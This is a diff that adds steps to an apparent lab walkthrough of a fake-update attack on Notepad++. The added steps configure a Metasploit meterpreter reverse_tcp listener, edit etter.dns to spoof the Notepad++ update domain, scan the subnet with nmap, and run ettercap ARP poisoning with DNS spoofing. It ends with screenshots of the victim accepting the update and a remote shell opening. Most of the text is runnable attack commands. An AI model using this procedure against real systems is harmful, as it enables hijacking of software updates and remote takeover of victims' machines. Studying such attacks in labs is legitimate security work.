@@ -131,5 +131,116 @@ evilgrade(notepadplus)>show options
 
 
 
+#### 4th STEP : build a meterpreter shell in the kali linux using Metasploit
+In this step, we create a reverse shell using Metasploit to wait for the targeted machine to connect kali linux meterpreter shell.
+
+open Metasploit 
+```
+msf > use exploit/multi/handler
+msf exploit(handler) > set LHOST 192.168.144.142
+msf exploit(handler) > set LPORT 4444
+msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
+```
+![image](https://user-images.githubusercontent.com/86700132/127679144-829cf665-960f-4374-930e-46e18f819444.png)
+
+
+
+To ensure the payload settings are properly set, type :
+```
+msf exploit(handler) > show options
+```
+![image](https://user-images.githubusercontent.com/86700132/127678924-800da6a9-975e-4d5f-9682-4856855cc2bd.png)
+
+
+
+Once the reverse shell is set properly, type command below to execute the reverse shell.
+```
+msf exploit(handler) > exploit
+```
+
+Once payload is set, go back to Evilgrade to execute the notepadplus module by using command below:
+```
+evilgrade(notepadplus)> start
+```
+
+
+#### 5th STEP: perform DNS spoofing attack using EtterCap
+Now, we open the ettercap.dns file to add the spoof notepad++ website DNS (domain name server). To check the location of etter.dns type:
+```
+root@kali:~# locate etter.dns
+```
+
+Then, type:
+```
+root@kali:~# cd /etc/ettercap
+```
+
+After that, to enter the etter.dns, type:
+```
+root@kali:/etc/ettercap# nano etter.dns
+```
+
+Then scroll down the file until you see the " microsoft suck ; ) " sentence. That is the place we need to configure spoof DNS server. Type command below as the figure below to set the spoof DNS server. 
+```
+notepad-plus.sourceforge.net A 192.168.144.142
+```
+![image](https://user-images.githubusercontent.com/86700132/127679472-6663af98-72cb-49d8-874b-e5f3e78479b0.png)
+
+
+
+To make sure the targeted machine is still havent disconnect from current network, type the command below:
+```
+root@kali:~# nmap –sn 192.168.144.0-255
+```
+![image](https://user-images.githubusercontent.com/86700132/127679566-99c44c79-6259-4d18-80ea-bfb220d31bb5.png)
+
+
+
+Now type the command below to run the DNS spoofing attack toward targeted machine using EtterCap. -T means text mode. -Q means super quite mode. -M means perform a man-in-the-middle attack. -P means plugin. 
+```
+root@kali:~# ettercap -T -Q -M arp -P dns_spoof //192.168.144.148//
+```
+![image](https://user-images.githubusercontent.com/86700132/127679678-f3ea7edf-e147-4350-84d0-63ba333beb56.png)
+
+
+
+The diagram above shows that DNS spoofing attack is performing. This attack scans every host available in current network, and then perform ARP poisoning attack to victim machine. 
+
+Now our work is done, we just wait for the victim to run the notepad++ application. 
+
+
+#### 6th STEP : waiting targeted machine to listen kali linux meterpreter shell
+We will wait for the victim to run the notepad++ application. If the victim opens it, it will ask victim to update the notepad++. Then if the victim clicks yes for 2 times, the malicious code injected in notepadplus module will be executed and makes targeted machine to listen to kali linux meterpreter shell.
+
+Let's jump to the targeted machine interface. When victim open the notepad++ executable. The executable will ask victim to update their notepad++. 
+
+The victim click yes button:
+
+![image](https://user-images.githubusercontent.com/86700132/127679864-6fa38aa8-7569-489e-9ac9-c5092c687c82.png)
+
+
+
+The victim click yes button again:
+
+![image](https://user-images.githubusercontent.com/86700132/127679956-23e87ef8-546f-4c41-ac80-9229c3032ca9.png)
+
+
+
+Back to the kali linux, diagram below show that the IP address and MAC address of ARP poisoning targeted machine and perform the DNS spoofing attack towards it.
+
+![image](https://user-images.githubusercontent.com/86700132/127680030-a289427b-6c2e-496f-9c94-d74743386e88.png)
+
+
+
+The diagrams below show that the targeted machine establishes the spoof notepad++ website connection and asks for update package to that website. Then the notepadplus module recieves the requests from spoof notepad++ website and returns .php file required and executes malicious code.
+
+![image](https://user-images.githubusercontent.com/86700132/127680092-e335df60-103b-4c03-8f0c-74e24da02028.png)
+![image](https://user-images.githubusercontent.com/86700132/127680107-cea9e724-4e3d-475d-a226-6b0bffad4f22.png)
+
+
+
+Back to the Metasploit, the diagram below shows that the targeted machine is listening to kali linux meterpreter shell.
+
+![image](https://user-images.githubusercontent.com/86700132/127680150-c577091e-a085-480c-bb9b-0badc1f68534.png)
 
 
